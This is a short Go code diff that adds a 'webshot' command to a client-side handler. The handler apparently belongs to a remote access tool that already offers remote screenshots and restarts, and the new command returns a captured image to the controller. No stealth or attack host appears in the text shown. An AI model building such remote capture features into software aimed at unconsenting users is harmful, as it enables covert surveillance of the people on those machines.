@@ -162,6 +162,17 @@ func (h *Handler) HandleCommand() {
 				}
 				response = screenshot
 				break
+			case "webshot":
+				fmt.Println("[client-handler] Webshot!")
+				webshot, err := h.Services.Webshot.TakeWebShot()
+				fmt.Println("webshot type:", reflect.TypeOf(webshot))
+				if err != nil {
+					hasErr = true
+					response = encode.StringToByte(err.Error())
+					break
+				}
+				response = webshot
+				break
 			case "restart":
 				if err := h.Services.OS.Restart(); err != nil {
 					hasErr = true
